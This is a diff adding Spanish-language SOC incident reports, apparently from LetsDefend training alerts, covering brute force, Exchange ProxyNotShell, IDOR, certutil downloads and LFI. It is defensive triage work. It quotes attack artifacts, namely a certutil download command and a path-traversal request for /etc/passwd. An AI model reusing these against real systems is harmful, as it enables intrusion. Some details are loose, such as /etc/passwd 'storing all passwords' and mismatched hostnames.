@@ -20,17 +20,17 @@ Para determinar si el ataque de fuerza bruta fue exitoso, se revisaron los regis
 
 Tras revisar los registros, se concluyó que el ataque no fue exitoso, ya que no se encontraron registros de un inicio de sesión exitoso después de una serie de intentos fallidos desde la misma dirección IP y hacia el mismo destino.
 
-### 2.a Actuación para el Restablecimiento de Servicios
+### Actuación para el Restablecimiento de Servicios
 
 Dado que el ataque no tuvo éxito, no fue necesario realizar ninguna acción para restablecer servicios afectados.
 
-### 3.a Acciones Destacadas y Análisis de Actuaciones
+### Acciones Destacadas y Análisis de Actuaciones
 
 - Se monitorearon los registros de auditoría para detectar cualquier actividad adicional.
 - Se llevó a cabo un análisis exhaustivo de los intentos de inicio de sesión fallidos para identificar patrones o comportamientos sospechosos.
 - Se registraron las lecciones aprendidas, incluyendo la importancia de tener medidas de seguridad robustas para evitar ataques de fuerza bruta.
 
-### 3.b Registro de Lecciones Aprendidas y Mejoras Propuestas
+### Registro de Lecciones Aprendidas y Mejoras Propuestas
 
 - **Lecciones Aprendidas:**
   - La importancia de contar con políticas de seguridad robustas para contraseñas, como el uso de contraseñas fuertes y la implementación de bloqueos después de varios intentos fallidos.
@@ -40,7 +40,7 @@ Dado que el ataque no tuvo éxito, no fue necesario realizar ninguna acción par
   - Reforzar las políticas de seguridad de contraseñas en todos los sistemas, incluyendo la implementación de bloqueos automáticos después de un número determinado de intentos fallidos.
   - Mejorar la capacidad de monitoreo y respuesta a incidentes para detectar y mitigar ataques de fuerza bruta de manera más efectiva.
 
-### 4.a Actuaciones para Evitar Repetición
+### Actuaciones para Evitar Repetición
 
 - Reforzar las políticas de seguridad de contraseñas, incluyendo la implementación de políticas de bloqueo de cuentas después de un número específico de intentos fallidos.
 - Implementar sistemas de detección de intrusiones para detectar y responder rápidamente a posibles ataques de fuerza bruta en el futuro.
@@ -304,3 +304,208 @@ Dado que la primera solicitud recibió una respuesta exitosa (código de estado 
 - Investigar más a fondo el origen y la naturaleza de la segunda solicitud para determinar la intención del atacante.
 - Evaluar si el servidor de SharePoint está parcheado y protegido contra la vulnerabilidad CVE-2023-29357.
 - Monitorizar y registrar actividades sospechosas o maliciosas en el servidor para detectar y prevenir posibles ataques futuros.
+
+
+
+## **Informe de Incidente - SOC210: Detección de Ataque de Fuerza Bruta en VPN**
+
+### **Detalles Iniciales:**
+- **Evento:** SOC210 - Posible Detección de Ataque de Fuerza Bruta en VPN
+- **Fecha y Hora:** Jun, 21, 2023, 01:51 PM (UTC)
+- **Nivel:** Analista de Seguridad
+- **Dirección de Origen:** 37.19.221.229
+- **Dirección de Destino:** 33.33.33.33
+- **Hostname de Destino:** Mane
+- **Nombre de Usuario:** mane@letsdefend.io
+- **Razón de Activación de la Alerta:** Se detectó un inicio de sesión exitoso en la VPN poco después de intentos fallidos de inicio de sesión desde la misma dirección IP de origen.
+
+### **Análisis Inicial:**
+- **Revisión de Registros:**
+  Se verificaron los registros de autenticación y se observaron varios intentos fallidos de inicio de sesión desde la misma dirección IP. También se detectó que la misma dirección IP intentaba iniciar sesión con diferentes usuarios. El inicio de sesión exitoso parece sospechoso después de estos intentos fallidos.
+  ![lista](imgNaim/1.png)
+  Podemos observar un monton de logs sobre la misma ip que son intentos de inicio de sesion.
+  ![alt text](imgNaim/2.png)
+  Ejemplos
+![alt text](imgNaim/5.png)
+- **Seguridad del Endpoint:**
+  Se buscó al usuario Mane en el sistema EPS para verificar si había actividades sospechosas, pero no se encontró ninguna actividad después de que se generara la alerta, es decir, después del inicio de sesión exitoso.
+  ![alt text](imgNaim/4.png)
+- **Búsqueda de la Dirección IP de Origen:**
+  Se realizó una búsqueda de la dirección IP en VirusTotal y AbuseIPDB, y se encontró que está marcada como maliciosa y categorizada como ataque de fuerza bruta.
+![alt text](imgNaim/6.png)
+### **Respuestas a las Preguntas del Playbook:**
+1. ¿Se detectaron solicitudes desde la dirección IP del atacante en EPS?
+   - Sí, se detectaron solicitudes desde la dirección IP del atacante.
+
+2. ¿El ataque fue exitoso según el análisis inicial de los registros?
+   - Sí, el ataque fue exitoso según el análisis inicial de los registros.
+
+3. ¿Se requiere contener el dispositivo afectado?
+![alt text](imgNaim/7.png)
+   - Sí, se requiere contener el dispositivo afectado ya que el ataque fue exitoso.
+
+### **Artefactos**
+![alt text](imgNaim/8.png)
+
+
+
+## **Informe de Incidente - SOC-GTSC: Explotación de Vulnerabilidades Zero-Day en Microsoft Exchange Server**
+
+### **Detalles Iniciales:**
+- **Evento:** Explotación de Vulnerabilidades Zero-Day en Microsoft Exchange Server
+- **Fecha:** Septiembre de 2022
+- **Equipo Responsable:** SOC-GTSC (Vietnam)
+- **Vulnerabilidades Afectadas:** CVE-2022–41040 y CVE-2022–41082
+- **Impacto:** Posibilidad de Ejecución Remota de Código (RCE)
+- **Alcance del Ataque:** Observado en menos de 10 organizaciones a nivel global
+
+### **Descripción del Incidente:**
+En agosto, el equipo SOC-GTSC descubrió dos nuevas vulnerabilidades, CVE-2022–41040 y CVE-2022–41082, en Microsoft Exchange Server, las cuales fueron reportadas a la Zero-day Initiative (ZDI) para una mayor coordinación con Microsoft. Estas vulnerabilidades permiten la ejecución remota de código (RCE) cuando se combinan. Según MSTIC, los ataques se realizan mediante la concatenación de CVE-2022–41040 y CVE-2022–41082 en un pequeño número de ataques dirigidos, observados en menos de 10 organizaciones a nivel global.
+
+CVE-2022–41040 es una vulnerabilidad de solicitud falsificada del lado del servidor (SSRF), mientras que CVE-2022–41082 permite la ejecución remota de código (RCE) cuando PowerShell de Exchange está accesible para el atacante. Es importante recordar que, para ser explotadas, ambas vulnerabilidades requieren acceso autenticado al servidor deseado, el cual puede ser el de un usuario estándar.
+
+### **Análisis y Respuesta:**
+- **Búsqueda de IP de Origen:**
+  Se identifica que la dirección IP de origen, 58.237.200.6, está marcada como maliciosa y está asociada a una empresa de telecomunicaciones de Corea del Sur.
+![alt text](imgNaim/9.png)
+- **Revisión de Registros:**
+  Se observa en los registros que se realizaron múltiples solicitudes desde la IP 58.237.200.6 al servidor con la IP 172.16.20.8, utilizando el puerto 443. Se identifican intentos de explotación de la vulnerabilidad Proxy(not)Shell, sin embargo, todas las tentativas fueron bloqueadas.
+![alt text](imgNaim/10.png)
+- **Tipo de Ataque:**
+  El tipo de ataque se clasifica como "other", ya que implica la explotación de una vulnerabilidad de ejecución remota de código cuando PowerShell de Exchange está accesible para el atacante.
+
+- **Planificación del Ataque:**
+  No se encuentra evidencia de que el ataque sea parte de una prueba planificada o simulación.
+![alt text](imgNaim/10.png)
+- **Dirección del Tráfico:**
+  El tráfico se origina desde Internet hacia la compañía, según lo observado en los registros.
+![alt text](imgNaim/11.png)
+- **Éxito del Ataque:**
+  No se considera un ataque exitoso, ya que todas las tentativas fueron bloqueadas por los dispositivos de seguridad.
+![alt text](imgNaim/12.png)
+- **Escalación de Nivel 2:**
+  No se requiere la escalación al Nivel 2, dado que el ataque no tuvo éxito y fue bloqueado por las medidas de seguridad existentes.
+![alt text](imgNaim/13.png)
+
+
+## **Informe de Incidente - SOC169: Posible Ataque IDOR Detectado**
+
+### **Detalles Iniciales:**
+- **Evento:** Alerta de Posible Ataque IDOR
+- **Fecha y Hora:** Feb, 28, 2022, 10:48 PM
+- **Nivel:** Analista de Seguridad
+- **Hostname:** WebServer1005
+- **IP de Destino:** 172.16.17.15
+- **IP de Origen:** 134.209.118.137
+- **Método de Solicitud HTTP:** POST
+- **URL Solicitada:** https://172.16.17.15/get_user_info/
+- **User-Agent:** Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
+- **Motivo de la Alerta:** Solicitudes consecutivas a la misma página
+- **Acción del Dispositivo:** Permitido
+
+### **Descripción del Incidente:**
+Se ha detectado una alerta indicando un posible ataque IDOR en la URL de la solicitud HTTP. Se procederá a investigar para determinar si se trata de una alerta verdaderamente positiva.
+
+### **Investigación:**
+- Se ha inspeccionado el endpoint WebServer1004 utilizando Log Management para analizar la comunicación entre el servidor web y la IP del actor de amenazas.
+- Se han detectado 5 registros entre estas dos direcciones IP, donde el actor de amenazas intentó modificar el parámetro "user_id" en la URL de la solicitud.
+- Tamaño de la Respuesta HTTP: 253 // Se devolvió una respuesta "data" para esta solicitud.
+- Estado de la Respuesta: 200 // Este código de estado indica una solicitud exitosa.
+- Parámetros POST: ?user_id=2 // La modificación realizada por el atacante.
+- Se ha realizado una investigación adicional sobre la IP del atacante, revelando que se trata de una IP maliciosa con un historial de varios intentos de ataques.
+
+### **Resultados de la Investigación:**
+Con esta evidencia, se confirma que se trató de un verdadero intento de ataque IDOR en WebServer1005. No se ha encontrado ninguna actividad sospechosa en la seguridad del correo electrónico, lo que indica que no se trató de un ataque planificado. Dado que el atacante logró su objetivo, se ha contenido WebServer1005 aislandolo. Además, se ha escalado esta alerta al equipo de analistas SOC de Nivel 2 para las acciones necesarias.
+
+### **Nota Final del Analista:**
+Se concluye que este fue un intento verdadero positivo de ataque IDOR en WebServer1005. Se han tomado las medidas necesarias para contener y escalar la alerta adecuadamente.
+
+
+## **Informe de Incidente - SOC163: Uso Sospechoso de Certutil.exe**
+
+### **Detalles Iniciales:**
+- **Evento:** Uso Sospechoso de Certutil.exe
+- **Fecha y Hora:** Marzo 1, 2022, 11:06 A.M
+- **Hostname:** EricProd
+- **IP de Origen:** 172.16.17.22
+- **Binary Relacionado:** certutil.exe
+- **Ruta del Binary:** C:/Windows/System32/certutil.exe
+- **Línea de Comando:** certutil.exe -urlcache -split -f hXXps://nmap[.]org/dist/nmap-7.92-win32.zip nmap.zip
+- **Acción EDR:** Permitido
+
+### **Descripción del Incidente:**
+Se ha detectado un uso sospechoso de Certutil.exe en el host EricProd. Certutil es utilizado por actores de amenazas para descargar archivos desde un sistema externo hacia un entorno comprometido.
+![alt text](imgNaim/15.png)
+### **Investigación:**
+- Se ha inspeccionado la consola de Monitoreo para obtener información útil sobre el evento de seguridad.
+- El atacante ejecutó un comando utilizando el ejecutable Certutil.
+- Certutil.exe es un programa de línea de comandos utilizado para diversas funciones relacionadas con Certificados y Servicios.
+- En este caso, el atacante utilizó Certutil para descargar archivos desde internet, incluyendo un archivo zip de Nmap y un script de Windows Exploit Suggester.
+![alt text](imgNaim/14.png)
+
+- Se ha verificado la ejecución de estos comandos utilizando Log Management y Endpoint Security.
+
+### **Resultados de la Investigación:**
+- Se ha confirmado que se trata de un incidente verdaderamente positivo.
+- Se observaron múltiples comandos sospechosos realizados por el atacante en el historial de comandos del endpoint.
+- Se ha detectado el acceso a URLs sospechosas por parte del host comprometido.
+- Se ha identificado la descarga de archivos y la ejecución de comandos potencialmente maliciosos.
+
+### **Contención:**
+sí
+### **Tareas Playbook:**
+- **¿La actividad actual es sospechosa?** Sí, sospechosa
+- **¿Qué actividad es sospechosa?** Descarga de archivos
+- **¿Quién realizó la actividad?** Usuario
+
+
+## **Informe de Incidente - SOC170: Posible Ataque LFI en el URL**
+
+**Tipo según Taxonomía:** Ataque LFI (Inclusión de Archivos Locales)
+**Criticidad:** Baja
+
+### **Detalles del Alerta:**
+- **Evento:** SOC170 - Passwd Found in Requested URL - Possible LFI Attack
+- **Fecha y Hora:** Marzo 1, 2022, 10:10 AM
+- **Hostname:** WebServer1006
+- **IP de Destino:** 172.16.17.13
+- **IP de Origen:** 106.55.45.162
+- **Método de Solicitud:** GET
+- **URL Solicitada:** https://172.16.17.13/?file=../../../../etc/passwd
+- **User-Agent:** Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
+- **Razón de Activación de la Alerta:** URL Contiene passwd
+- **Acción del Dispositivo:** Permitido
+
+### **Descripción del Incidente:**
+Se ha activado una alerta indicando un posible ataque LFI en el URL de la solicitud HTTPS. Se procederá a investigar para determinar si se trata de una alerta verdadera positiva.
+![alt text](imgNaim/19.png)
+### **Investigación:**
+- Se ha inspeccionado el endpoint WebServer1006 utilizando Log Management para analizar la comunicación entre el servidor web y la IP del actor de amenazas 106.55.45.162.
+![alt text](imgNaim/16.png)
+- La IP sospechosa intentó acceder a un URL y trató de alcanzar el directorio raíz para obtener acceso al archivo "passwd", que almacena todas las contraseñas en el servidor.
+![alt text](imgNaim/17.png)
+- La solicitud generó un código de estado 500, lo que indica un error interno del servidor. No se ha devuelto ninguna respuesta, lo que confirma que el ataque no fue exitoso.
+- Se ha verificado la IP del atacante en VirusTotal, confirmando su origen en China.
+
+### **Resultados de la Investigación:**
+- La alerta es una verdadera positiva, indicando un intento de ataque.
+![alt text](imgNaim/18.png)
+- El ataque no fue exitoso, ya que el servidor devolvió un código de estado 500 sin respuesta.
+![alt text](imgNaim/20.png)
+- No es necesario contener WebServer1006, ya que el ataque no tuvo éxito.
+- No es necesario escalar el incidente al equipo SOC de Nivel 2.
+![alt text](imgNaim/21.png)
+- El ataque se originó desde Internet hacia la red local.
+
+### **Conclusión:**
+El incidente se ha investigado exhaustivamente y se ha confirmado que no representó una amenaza real para el sistema. No se requieren acciones adicionales en este momento.
+
+
+### **Registro de Lecciones Aprendidas y Mejoras Propuestas**
+- Mantener sistemas actualizados y parcheados para mitigar posibles vulnerabilidades.
+- Implementar medidas de seguridad adicionales, como listas blancas de IPs, para restringir el acceso a recursos sensibles.
+- Mejorar la monitorización y detección de ataques LFI para una respuesta más rápida y efectiva.
+
+### **Actuaciones para Evitar Repetición**
+- Implementar restricciones de acceso a archivos sensibles mediante configuraciones de seguridad adecuadas en el servidor web.
+- Realizar análisis de seguridad regulares para identificar y corregir posibles vulnerabilidades LFI en el sistema.
